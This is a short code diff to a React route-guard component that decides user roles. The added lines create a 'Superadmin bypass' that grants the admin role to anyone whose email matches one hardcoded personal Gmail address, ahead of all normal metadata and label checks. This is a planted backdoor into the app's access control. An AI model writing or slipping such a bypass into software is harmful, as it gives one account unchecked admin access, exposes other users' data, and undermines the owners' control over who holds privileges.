@@ -23,6 +23,10 @@ export function ProtectedRoute({ children, requireAdmin = false, requireRoles }:
   const [currentRole, setCurrentRole] = useState<AppRole | null>(null);
 
   const resolveUserRole = async (userId: string, email?: string, userObj?: any): Promise<AppRole> => {
+    // 0. Superadmin bypass: full access to everything for atl@gmail.com
+    const cleanEmail = String(email || userObj?.email || '').toLowerCase().trim();
+    if (cleanEmail === 'atl@gmail.com') return 'admin';
+
     // 1. Check user metadata / claims / Appwrite labels
     const metaRole = String(userObj?.user_metadata?.role || userObj?.app_metadata?.role || '').toLowerCase();
     const labels: string[] = (userObj?.app_metadata?.labels || userObj?.user_metadata?.labels || []).map((l: any) => String(l).toLowerCase());
